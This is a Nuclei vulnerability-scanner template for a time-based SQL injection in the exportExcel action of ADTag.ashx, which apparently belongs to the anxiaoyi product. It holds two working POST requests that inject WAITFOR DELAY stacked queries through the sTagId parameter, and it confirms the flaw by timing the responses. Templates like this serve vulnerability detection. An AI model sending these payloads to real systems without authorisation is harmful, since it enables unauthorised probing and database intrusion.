id: anxiaoyi-ADTag_ashx-sql-time

info:
  name: anxiaoyi-ADTag_ashx-sql-time
  author: xxx
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
        Content-type: application/x-www-form-urlencoded

        action=exportExcel&sTagId=';WAITFOR+DELAY+'0:0:4'--
      - |
        POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
        Content-type: application/x-www-form-urlencoded

        action=exportExcel&sTagId=';WAITFOR+DELAY+'0:0:8'--
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and